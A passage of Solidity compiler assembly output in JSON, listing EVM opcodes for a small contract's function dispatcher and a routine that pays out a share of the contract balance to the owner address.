											"begin": 176,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "4E1C5914"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "8B7AFE2E"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "BE10862B"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 176,
											"end": 1342,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 686,
											"end": 703,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 706,
											"end": 736,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 732,
											"end": 735,
											"name": "PUSH",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 706,
											"end": 727,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 706,
											"end": 731,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 706,
											"end": 731,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 706,
											"end": 736,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 706,
											"end": 736,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 706,
											"end": 736,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 706,
											"end": 736,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 706,
											"end": 736,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 706,
											"end": 736,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 706,
											"end": 736,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 686,
											"end": 736,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 686,
											"end": 736,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 880,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 873,
											"end": 880,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 873,
											"end": 880,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 873,
											"end": 880,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 873,
											"end": 880,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 873,
											"end": 880,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 880,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 873,
											"end": 880,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 873,
											"end": 880,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 873,
											"end": 880,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 873,
											"end": 885,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 873,
											"end": 885,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 892,
											"end": 904,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "tag",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 873,
											"end": 909,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 873,
											"end": 909,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 367,
											"end": 372,
											"name": "PUSH",
											"source": 0,
											"value": "A9E"
										},
										{
											"begin": 920,
											"end": 934,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 920,
											"end": 934,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 935,
											"end": 947,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 920,
											"end": 948,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 920,
											"end": 948,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 920,
											"end": 948,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
